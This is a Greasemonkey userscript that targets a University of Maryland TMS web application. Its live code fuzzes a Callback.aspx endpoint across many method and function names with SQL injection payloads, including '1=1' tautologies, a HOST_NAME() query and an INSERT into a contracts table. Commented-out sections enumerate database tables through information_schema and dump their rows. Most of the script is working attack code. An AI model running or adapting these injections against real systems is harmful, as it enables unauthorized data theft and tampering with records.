// ==UserScript==
// @name           TMS Fun
// @namespace      http://nts.umd.edu/
// @include        https://tms-dev.net.umd.edu:444/*
// @include        https://tms.net.umd.edu:444/*
// @include        https://tms-dev.net.umd.edu/*
// @include        http://tms-dev.net.umd.edu/*
// @include        https://tms.net.umd.edu/*
// @include        http://tms.net.umd.edu/*
// @include	   http://nts-service.umd.edu/MainLogon.aspx
// ==/UserScript==


/**
 * document.createElement convenience wrapper
 *
 * The data parameter is an object that must have the "tag" key, containing
 * a string with the tagname of the element to create.  It can optionally have
 * a "children" key which can be: a string, "data" object, or an array of "data"
 * objects to append to this element as children.  Any other key is taken as an
 * attribute to be applied to this tag.
 *
 * Release homepage:
 * http://www.arantius.com/article/dollar+e
 *
 * Available under an MIT license:
 * http://www.opensource.org/licenses/mit-license.php
 *
 * @param {Object} data The data representing the element to create
 * @return {Element} The element created.
 */
function $E(data) {
	var el;
	if ('string'==typeof data) {
		el=document.createTextNode(data);
	} else {
		//create the element
		el=document.createElement(data.tag);
		delete(data.tag);

		//append the children
		if ('undefined'!=typeof data.children) {
			if ('string'==typeof data.children ||
				'undefined'==typeof data.children.length
			) {
				//strings and single elements
				el.appendChild($E(data.children));
			} else {
				//arrays of elements
				for (var i=0, child=null; 'undefined'!=typeof (child=data.children[i]); i++) {
					el.appendChild($E(child));
				}
			}
			delete(data.children);
		}

		//any other data is attributes
		for (attr in data) {
			el[attr]=data[attr];
		}
	}

	return el;
}

function pp(s)
{
	GM_log(s);

/*
	document.createTextNode(s);

	var element = $E([{
	    tag:'div',
	    className:'debug',
	    id:'debug'},
           s
	]);
*/
}


function DoCallback(url, method, params)
{
	var pageUrl = url + '?' + 'RandomKey=' + encodeURIComponent(Math.random() * Date.parse(new Date())) +  '&callback=' + encodeURIComponent('true') + '&method=' + encodeURIComponent(method) + '&param=' + encodeURIComponent(params);


		var xmlRequest = new XMLHttpRequest();
		xmlRequest.open("GET", pageUrl, false);
		xmlRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xmlRequest.send(null);

	
	return xmlRequest;
}


var methods = new Array(null,'',"Generic","Select","Purge","Rating","Report","Resale","Technician","TroubleTicket","User","WorkOrder","DefaultGL","Department","EMail","EntityTrack","Facilities","Inventory");
var callbackfunctions = new Array(null,'', "GetCookie","ES_SetAccountSeq", "SQLSelectNValuesAllRows","GetRecordID","GetRecordSeq","GetTrackingInfo", "GetEntityAndParentInfo" ,"GetEntityChildren" ,"GetEntityInfo" ,"GetRecordID" ,"GetRecordSeq" ,"GetTrackingInfo" ,"CheckUseriEquipStartDates" ,"CheckUseriUsernOpenDates" ,"DetermineDataAccess" ,"FillSelection" ,"GenerateNewChangeNbr" ,"GetTableFields" ,"GetTables" ,"GetTableSeqFromScreenMasterSeq" , "COSTMAINT_GETACCOUNTNUMBER" , "COSTMAINT_GETTRANCODE" , "COSTMAINT_GETINVOICENBR" , "CH_GETCOMMENTTEXT" , "CS_GETUSERPHONE" , "PT_GETACCOUNTINFOFIELDS" , "CALL_GETEVALORDER" , "ES_SETACCOUNTSEQ" , "ES_GETJACKSEQ" , "TRANS_COUNTASSOCIATEDDEBITTCODES" , "UDS_GETSCREENFIELDCONTROLTYPE" , "GETPICKSCREENMASTERSEQ" , "GETGLDATESANDSTATUS" , "GETREVIEWPLANSEQ" , "GETREVIEWTEMPLATENAME" , "GETUSERACCESSCOUNT" , "GETIOVENDORCOUNT" , "GETLDAPATTRIBUTESCOUNT" , "GETINVENTORYORDERCOUNT" , "GETVENDORNAME" , "GETSHOPCARTCATEGORYNAME" , "GETGLNUMBER" , "MSCHANGELISTINGTITLE" , "UN_CONFLICTINGUSERNUMBEREXISTS" , "COM_BUILDEMAILTEMPLATELIST" , "GETREVIEWTEMPLATEID" , "LDAPMYSOFTKEYWORDEXISTS" , "NTIDMAYACCESSEXECUTABLE" , "ESC_BUILDEMAILTEMPLATELIST_1" , "P_GETOPENITEMFLAG" , "P_PROCESSPAYMENTBATCHFORACCOUNT" , "PB_PROCESSPAYMENTBATCH" , "TDDC_INCREMENTDROPCONDITIONEVALORDER" , "GETSTEPFORPLANANDSTEPNAME" , "GETFIRSTSTEPFORREVIEWPLAN" , "USERHASACCESSTOSTEP" , "VALIDATEUSERHIPAAACCESS" , "VIT_DATEOFVARIANCES" , "VIT_SHOWSINGLEVARIANCE" , "AVAILQTYFORADJUSTMENT" , "ISSVALIDATESERIALNBR" , "CALCULATETOTALORDERAMT" , "COUNTITEMSONORDER" , "GETQTYSONHAND" , "GETITEMONORDER" , "GETQTYRECEIVEDONORDER" , "GETRECEIVEDBACKORDEREDCANCELLEDONREC" , "TRACKINVENTORY" , "GETVENDORITEMSEQ" , "ISITEMACTIVE" , "ISITEMNBRVALID" , "GETSERIALNBRCOMPLETEFORRECEIPT" , "GETRECEIPTSEQFORORDERITEM" , "GETCITYPESEQFORITEM" , "ISSERIALNBRDUPLICATE" , "COUNTCIONRECEIPT" , "CALCULATETOTALRECONINVORDER" , "GETITEMNBRSEQ" , "GETINVORDERDETAILSEQ" , "GETSTORAGELOCSEQ" , "GETBINMASTERSEQ" , "GETITEMNBRANDQTYFOREXPRESSRECEIPT" , "GETITEMBNRSEQFOREXPRESSRECEIPTPROMPT" , "REBUILDSELECTIONWITHWHERE" , "WOP_SETTABLEMASTERSEQ" , "VI_DATEOFVARIANCES" , "REBUILDSHOPCARTCATEGORIES" , "REBUILDSCREENLISTBYTABLEID" , "INV_REBUILDCITEMPLATELIST" , "EST_REBUILDWORKORDERLIST" , "EST_GETESTIMATEITEMQTY" , "EST_GETESTPROJECTIDFROMESTITEM" , "GETCONTACTEMAILFROMITEM" , "TRDET_GETDROPCODEDESCRIPTION" , "INV_BUILDCITEMPLATESELECTIONLIST" , "REVIEW_COUNTOUTSTANDINGSTEPS" , "EXPRESSVALIDATELOCATION");     








var parama1s = new Array(null,'',"1","123 or 1=1", "'", "1 or 1=1 SELECT HOST_NAME()", "1\n INSERT INTO tbl_Contracts (ContractID, VendorSeq) VALUES ('447',7)");
var parama2s = new Array(null,'',"1","123 or 1=1", "'", "1 or 1=1 SELECT HOST_NAME()", "1\n INSERT INTO tbl_Contracts (ContractID, VendorSeq) VALUES ('447',7)");




pp('debug TMS Fun');


for (method in methods)
{

	for (callbackfunction in callbackfunctions)
	{
		for (parama1 in parama1s)
		{
			for (parama2 in parama2s)
			{

				var parms1 = 'MYSOFTSA ~|~ '+ callbackfunctions[callbackfunction] +' ~|~ ' + parama1s[parama1];
				var xmlRequest = DoCallback('/Callback.aspx', methods[method], parms1);
				if (!((xmlRequest.responseText == '')||(xmlRequest.responseText == '45MEBB1JEDDE9J3DK6'))) {
					pp(methods[method]+': '+parms1+': ' + xmlRequest.responseText);
				}
			
			
				var parms2 = 'MYSOFTSA ~|~ '+ callbackfunctions[callbackfunction] +' ~|~ ' + parama1s[parama1] + ' ~|~ ' + parama2s[parama2];
				var xmlRequest = DoCallback('/Callback.aspx', methods[method], parms2);
				if (!((xmlRequest.responseText == '')||(xmlRequest.responseText == '45MEBB1JEDDE9J3DK6'))) {
					pp(methods[method]+': '+parms2+': ' + xmlRequest.responseText);
				}

				var parms3 = ' ~|~ '+ callbackfunctions[callbackfunction] +' ~|~ ' + parama1s[parama1] + ' ~|~ ' + parama2s[parama2];
				var xmlRequest = DoCallback('/Callback.aspx', methods[method], parms3);
				if (!((xmlRequest.responseText == '')||(xmlRequest.responseText == '45MEBB1JEDDE9J3DK6'))) {
					pp(methods[method]+': '+parms3+': ' + xmlRequest.responseText);
				}

				break;

			}
		}	
	
	}
}	

/*
var gmsql ="SELECT HOST_NAME()";


var gmurl ="/Callback.aspx";
var gmparams = ' ~|~ SQLSelectNValuesAllRows ~|~ 1 ~|~ '+gmsql;
var gmCallbackXmlRequest = new XMLHttpRequest();
var gmparamsPlus = escape(gmparams).replace('+','%2B');
var gmpageUrl = gmurl + '?RandomKey=' + Math.random() * Date.parse(new Date()) + '&callback=true&method=' + '' + '&param=' + gmparamsPlus;


gmCallbackXmlRequest.open("GET", gmpageUrl, false);
gmCallbackXmlRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
gmCallbackXmlRequest.send(null);

if (!(gmCallbackXmlRequest.responseText == null || gmCallbackXmlRequest.responseText == 'NO DATA')) {
   pp(gmpageUrl+" "+gmCallbackXmlRequest.responseText);
}

*/
//Callback.aspx?RandomKey=699630262419.7393&callback=true&method=&param=%20%7E%7C%7E%20SQLSelectNValuesAllRows%20%7E%7C%7E%201%20%7E%7C%7E%20SELECT%20HOST_NAME%28%29 



//var gmsql ="SELECT HOST_NAME()";



//var pageUrl = sCallBack + '?RandomKey=' + Math.random() * Date.parse(new Date()) + '&callback=true&method=Generic&param=' + encodeURIComponent(parms);


/*
var gmurl ="Callback.aspx";
var gmparams = ' ~|~ SetAccounSeq ~|~ 1 ~|~ 11 OR 1=1'; //~|~ '+gmsql;
var gmCallbackXmlRequest = new XMLHttpRequest();
var gmparamsPlus = escape(gmparams).replace('+','%2B');
var gmpageUrl = gmurl + '?RandomKey=' + Math.random() * Date.parse(new Date()) + '&callback=true&method=' + '' + '&param=' + gmparamsPlus;
pp(gmpageUrl);

gmCallbackXmlRequest.open("GET", gmpageUrl, false);
gmCallbackXmlRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
gmCallbackXmlRequest.send(null);

if (!(gmCallbackXmlRequest.responseText == null || gmCallbackXmlRequest.responseText == 'NO DATA')) {
   pp(gmCallbackXmlRequest.responseText);
}
*/







/*


var gmsql ="SELECT table_name FROM information_schema.tables";


var gmurl ="Callback.aspx";
var gmparams = ' ~|~ SQLSelectNValuesAllRows ~|~ 1 ~|~ '+gmsql;
var gmCallbackXmlRequest = new XMLHttpRequest();
var gmparamsPlus = escape(gmparams).replace('+','%2B');
var gmpageUrl = gmurl + '?RandomKey=' + Math.random() * Date.parse(new Date()) + '&callback=true&method=' + '' + '&param=' + gmparamsPlus;


gmCallbackXmlRequest.open("GET", gmpageUrl, false);
gmCallbackXmlRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
gmCallbackXmlRequest.send(null);

if (!(gmCallbackXmlRequest.responseText == null || gmCallbackXmlRequest.responseText == 'NO DATA')) {
   var gmtables = gmCallbackXmlRequest.responseText.split('~~~');
}


//for (var gmtablenum in gmtables)
for (var gmtablenum=0;gmtablenum<5;gmtablenum++)
{

  var gmtable = gmtables[gmtablenum];
  //var gmtable = "tbl_GeneralLedgerMaster";

  pp(gmtable);

  var gmsql ="select count(*) from " + gmtable;

  var gmurl ="Callback.aspx";
  var gmparams = ' ~|~ SQLSelectNValues ~|~ 1 ~|~ '+gmsql;
  var gmCallbackXmlRequest = new XMLHttpRequest();
  var gmparamsPlus = escape(gmparams).replace('+','%2B');
  var gmpageUrl = gmurl + '?RandomKey=' + Math.random() * Date.parse(new  Date()) + '&callback=true&method=' + '' + '&param=' + gmparamsPlus;


  gmCallbackXmlRequest.open("GET", gmpageUrl, false);
  gmCallbackXmlRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  gmCallbackXmlRequest.send(null);

  if (!(gmCallbackXmlRequest.responseText == null ||  gmCallbackXmlRequest.responseText == 'NO DATA')) {
    gmresults = gmCallbackXmlRequest.responseText.split('~|~');

    var gmrows = gmresults[0];

  }


  var gmsql = "select count(*) from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = '" + gmtable + "'";

  var gmurl ="Callback.aspx";
  var gmparams = ' ~|~ SQLSelectNValues ~|~ 1 ~|~ '+gmsql;
  var gmCallbackXmlRequest = new XMLHttpRequest();
  var gmparamsPlus = escape(gmparams).replace('+','%2B');
  var gmpageUrl = gmurl + '?RandomKey=' + Math.random() * Date.parse(new Date()) + '&callback=true&method=' + '' + '&param=' + gmparamsPlus;


  gmCallbackXmlRequest.open("GET", gmpageUrl, false);
  gmCallbackXmlRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  gmCallbackXmlRequest.send(null);

  if (!(gmCallbackXmlRequest.responseText == null || gmCallbackXmlRequest.responseText == 'NO DATA')) {
    var gmcolumns = gmCallbackXmlRequest.responseText;
  }

//pp(gmcolumns);



    var gmsql = "select * from " + gmtable;

    var gmurl ="Callback.aspx";
    var gmparams = ' ~|~ SQLSelectNValuesAllRows ~|~ '+gmcolumns+' ~|~ '+gmsql;
    var gmCallbackXmlRequest = new XMLHttpRequest();
    var gmparamsPlus = escape(gmparams).replace('+','%2B');
  //pp(gmparamsPlus);

    var gmpageUrl = gmurl + '?RandomKey=' + Math.random() * Date.parse(new Date()) + '&callback=true&method=' + '' + '&param=' + gmparamsPlus;


    gmCallbackXmlRequest.open("GET", gmpageUrl, false);
    gmCallbackXmlRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    gmCallbackXmlRequest.send(null);

    if (!(gmCallbackXmlRequest.responseText == null || gmCallbackXmlRequest.responseText == 'NO DATA')) {
      var gmrowdata = gmCallbackXmlRequest.responseText.split('~~~');
    }

    for (var gmj=0;gmj<5;gmj++) //gmj<gmrows
    {
      pp(gmrowdata[gmj]);
    }



}
*/
pp("Finished with SQL");
